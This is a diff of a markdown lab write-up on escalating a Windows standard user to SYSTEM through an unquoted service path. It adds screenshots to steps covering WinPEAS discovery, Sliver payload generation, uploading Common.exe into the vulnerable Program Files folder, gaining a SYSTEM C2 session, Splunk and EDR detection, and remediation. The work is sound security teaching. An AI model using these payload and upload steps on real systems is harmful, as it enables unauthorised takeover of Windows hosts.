@@ -5,6 +5,15 @@
 Objective  
 Escalate privileges from a Standard User (Medium Integrity) to NT AUTHORITY\SYSTEM (High Integrity).
 
+Our current privilege:
+<p align="center">
+  <img src="images/normal.png">
+</p>
+<p align="center">
+  <em>Figure 1:Standard user with low level privilege.</em>
+</p>
+
+
 MITRE ATT&CK Mapping  
 - Tactic: TA0004 – Privilege Escalation  
 - Technique: T1574.009 – Path Interception (Unquoted Service Path)
@@ -68,9 +77,21 @@ Vulnerable Binary Path:
 
     C:\Program Files\Vulnerable Service\Common Files\Target.exe
 
-SCREENSHOT REQUIRED:
-- WinPEAS output highlighting the unquoted service path in red
+<p align="center">
+  <img src="images/winpeas.png">
+</p>
+<p align="center">
+  <em>Figure 1:WinPEAS output highlighting the unquoted service path in red</em>
+</p>
 
+The service from windows:
+
+<p align="center">
+  <img src="images/service.png">
+</p>
+<p align="center">
+  <em>Figure 1:Vulnerable Service</em>
+</p>
 ---
 
 ### Step 2: Weaponization — Service-Compatible Payload
@@ -87,8 +108,13 @@ Command:
       --name CommonSvc \
       --save /home/kali/Comm
 
-SCREENSHOT REQUIRED:
-- Sliver payload generation command and successful output
+<p align="center">
+  <img src="images/payload.png">
+</p>
+<p align="center">
+  <em>Figure 1:Sliver payload generation command and successful output</em>
+</p>
+
 
 ---
 
@@ -104,8 +130,20 @@ Upload command:
 
     upload /home/kali/Common.exe "C:\\Program Files\\Vulnerable Service\\Common.exe"
 
-SCREENSHOT REQUIRED:
-- File successfully uploaded in the vulnerable directory (Explorer or CLI)
+<p align="center">
+  <img src="images/upload.png">
+</p>
+<p align="center">
+  <em>Figure 1: Upload command.</em>
+</p>
+
+
+<p align="center">
+  <img src="images/landed.png">
+</p>
+<p align="center">
+  <em>Figure 1:File successfully uploaded in the vulnerable directory (Explorer or CLI)</em>
+</p>
 
 ---
 
@@ -119,8 +157,21 @@ Instead of forcing a service restart:
   - Service Control Manager executes Common.exe
   - Process runs with SYSTEM privileges
 
-SCREENSHOT REQUIRED:
-- System uptime reset or service restart timestamp (optional but recommended)
+<p align="center">
+  <img src="images/service.png">
+</p>
+<p align="center">
+  <em>Figure 1: Service information</em>
+</p>
+
+System Behavior: Upon startup, the Windows Service Control Manager (SCM) automatically executed Common.exe with SYSTEM privileges. 
+
+<p align="center">
+  <img src="images/C2.png">
+</p>
+<p align="center">
+  <em>Figure 1: C2 established.</em>
+</p>
 
 ---
 
@@ -136,8 +187,13 @@ Result:
 
     NT AUTHORITY\SYSTEM
 
-SCREENSHOT REQUIRED:
-- Sliver C2 session and whoami output confirming SYSTEM access
+<p align="center">
+  <img src="images/SYSTEM.png">
+</p>
+<p align="center">
+  <em>Figure 1: Sliver C2 session and whoami output confirming SYSTEM access.</em>
+</p>
+
 
 ---
 
@@ -182,8 +238,18 @@ Why this matters:
 - services.exe should only launch legitimate service binaries
 - Confirms successful path interception
 
-SCREENSHOT REQUIRED:
-- Splunk process creation event showing SYSTEM-level execution
+<p align="center">
+  <img src="images/process.png">
+</p>
+<p align="center">
+
+
+<p align="center">
+  <img src="images/process2.png">
+</p>
+<p align="center">
+  <em>Figure 1:Splunk process creation event showing SYSTEM-level execution</em>
+</p>
 
 ---
 
@@ -205,9 +271,6 @@ Remediation Steps:
 
 3. Clean  
    - Remove malicious binary from disk
-
-SCREENSHOT REQUIRED:
-- sc qc output or registry view showing corrected quoted path
 
 ---
 
@@ -231,8 +294,13 @@ Observed Telemetry:
 Assessment:
 Execution of an unsigned binary from a user-writable directory under SYSTEM context strongly indicates service binary hijacking via unquoted service path abuse.
 
-SCREENSHOT REQUIRED:
-- LimaCharlie timeline showing services.exe spawning Common.exe
+<p align="center">
+  <img src="images/edr.png">
+</p>
+<p align="center">
+  <em>Figure 1:LimaCharlie timeline showing services.exe spawning Common.exe</em>
+</p>
+- 
 
 ---
 
